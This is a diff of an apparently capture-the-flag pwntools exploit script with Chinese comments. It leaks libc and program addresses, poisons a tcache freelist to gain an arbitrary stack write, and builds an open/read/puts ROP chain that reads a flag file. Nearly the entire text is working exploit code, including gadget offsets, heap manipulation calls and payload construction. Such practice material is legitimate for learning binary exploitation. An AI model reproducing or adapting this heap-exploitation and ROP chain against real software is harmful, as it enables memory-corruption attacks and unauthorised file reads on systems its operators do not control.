@@ -78,6 +78,9 @@ one_gadget=libcbase+0xe3b34
 setcontext = libcbase + libc.symbols['setcontext']
 getkeyserv_handle=libcbase+0x0000000000001441
 environ_addr=libcbase+libc.symbols['__environ']
+print('open_addr',hex(open_addr))
+print('pop_rdi',hex(pop_rdi))
+print('pop_rsi',hex(pop_rsi))
 print('environ_addr',hex(environ_addr))
 print('freehook',hex(free_hook))
 print('system',hex(system_addr))
@@ -85,7 +88,7 @@ print('setcontext',hex(setcontext))
 print('getkeyserv_handle',hex(getkeyserv_handle))
 printf_addr=libcbase+libc.symbols['printf']
 write_addr=libcbase+libc.symbols['write']
-
+#success
 # 0xe3b2e
 # 0xe3b31
 # 0xe3b34
@@ -116,21 +119,23 @@ pro_addr=u64(p.recv(6).ljust(8,b'\x00')) #程序本身的地址
 print("pro_addr",hex(pro_addr))
 pro_offset=pro_addr-0x1a30
 print("pro_offset",hex(pro_offset))
-# pause()
+                                        
 buf_addr=pro_offset+0x4060
 # pause()
 # context.log_level = 'debug' 
-add(0x30,b'./flag\x00')#23
+add(0x30,b'./flag\x00')#23                  #success
 
 add(0x10,b'r\x00')#24
 free(0)
 free(23)
 edit(23,p64(buf_addr+0x10))
-
+print('buf_addr+8*25',hex(buf_addr+8*25))
 add(0x30,b'flag\x00\x00\x00\x00')#25
 print("under_rbp",hex(stack_addr-0x230))
-add(0x30,p64(stack_addr-0x230)+p64(0))#26 #得到最有用的控制权，任意地址写
-
+add(0x30,p64(stack_addr-0x230)+p64(environ_addr-0x10))#26 #得到最有用的控制权，任意地址写
+# pause()
+edit(3,p64(0)*5+b'\x00')            #success
+# pause()
 # p.interactive()
 # rop_link=flat([ pop_rdi,buf_addr+8*25,puts_addr])
 # rop_link=flat([ 
@@ -144,14 +149,21 @@ puts_plt=elf.plt['puts']+pro_offset
 #     pop_rdi,buf_addr+8*25,puts_addr,pop_rdi,buf_addr+8*27,puts_addr])
 print(hex(puts_plt))
 context.log_level = 'debug' 
-pause()
-
 # rop_link=flat([pop_rax,0,pop_rdi,buf_addr+8*25,pop_rsi,4, open_addr,mov_rax_rdi, pop_rsi,buf_addr+8*27,pop_rdx_rcx_rbx,20,20,20,pop_rax,0,read_addr, pop_rdi,buf_addr+8*27,puts_addr,pop_rdi,buf_addr+8*25,puts_addr])
-rop_link=flat([
-    pop_rax,2,pop_rdi,buf_addr+8*25,syscall_addr, \
-    pop_rdi,buf_addr+8*25,puts_addr
-])
+# open
+rop_link = p64(pop_rdi)+p64(buf_addr+8*25)+p64(pop_rsi)+p64(0)+p64(open_addr)
+# read
+rop_link+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0xb50)+p64(pop_rdx_rcx_rbx)+p64(0x30)*3+p64(read_addr)
+# puts
+rop_link+= p64(pop_rdi)+p64(heap_addr+0xb50)+p64(puts_addr)
+rop_link+= p64(pop_rdi)+p64(heap_addr+0xb50)+p64(puts_addr)
+# rop_link+=p64(main_addr)
+# rop_link=flat([
+#     pop_rax,2,pop_rdi,buf_addr+8*25,syscall_addr, \
+#     pop_rdi,buf_addr+8*25,puts_addr
+# ])
 # 
+pause()
 edit(2,rop_link)#这段rop被放在rbp下面
 # print(p.recv())
 pause()
